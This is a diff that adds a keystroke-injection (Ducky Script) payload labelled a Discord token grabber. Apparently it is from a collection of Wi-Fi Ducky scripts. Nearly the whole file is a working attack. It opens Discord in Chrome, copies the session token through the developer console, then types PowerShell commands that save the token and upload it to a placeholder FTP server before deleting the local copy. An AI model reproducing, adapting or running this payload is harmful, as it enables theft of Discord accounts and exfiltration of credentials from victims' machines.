@@ -1,0 +1,99 @@
+REM Written by HonkinWaffles https://github.com/HonkinWaffles/Wi-Fi-Ducky-Scripts
+REM Discord Token Grabber (FTP)
+
+REM !! CHANGES REQUIRED !!
+REM <FTP_URL> - FTP server to upload to
+REM Credentials if anonymous is not enabled
+
+DEFAULTDELAY 300
+
+REM Open Chrome + Navigate to Discord
+GUI r
+STRING chrome www.discord.com/login
+ENTER
+DELAY 4000
+
+REM Open dev console and setup for ease of use
+F12
+DELAY 500
+F1
+TAB
+REPEAT 3
+SPACE
+ENTER
+ESC
+
+REM Navigate to Applications tab and grab token
+CONTROL 7
+DELAY 500
+CTRL SHIFT M
+UP
+REPEAT 10
+DOWN
+REPEAT 2
+RIGHT
+REPEAT 3
+TAB
+TAB
+STRING token
+TAB
+REPEAT 2
+ENTER
+TAB
+ENTER
+CTRL c
+
+REM Restore deve console
+CTRL SHIFT M
+F1
+TAB
+REPEAT 3
+SPACE
+CTRL F4
+
+REM Open Powershell as Administrator (By passing only the UAC prompt not Password)
+GUI r
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Upload the token to a FTP server
+DEFAULTDELAY 50
+STRING $81g =
+CTRL v
+ENTER
+STRING $25s = 'betr435.txt'
+ENTER
+STRING $32f = '<FTP_URL>'
+ENTER
+STRING $81g | Out-File -FilePath C:\Users\Public\$25s
+ENTER
+STRING $ftp = [System.Net.FtpWebRequest]::Create("ftp://$32f/$25s")
+ENTER
+STRING $ftp = [System.Net.FtpWebRequest]$ftp
+ENTER
+STRING $ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+ENTER
+STRING $ftp.Credentials = new-object System.Net.NetworkCredential("anonymous","$32f")
+ENTER
+STRING $ftp.UseBinary = $true
+ENTER
+STRING $ftp.UsePassive = $true
+ENTER
+STRING $content = [System.IO.File]::ReadAllBytes("C:\Users\Public\$25s")
+ENTER
+STRING $ftp.ContentLength = $content.Length
+ENTER
+STRING $rs = $ftp.GetRequestStream()
+ENTER
+STRING $rs.Write($content, 0, $content.Length)
+ENTER
+STRING $rs.Close()
+ENTER
+STRING $rs.Dispose()
+ENTER
+STRING Remove-Item C:\Users\Public\$25s
+ENTER
+STRING exit
+ENTER
+
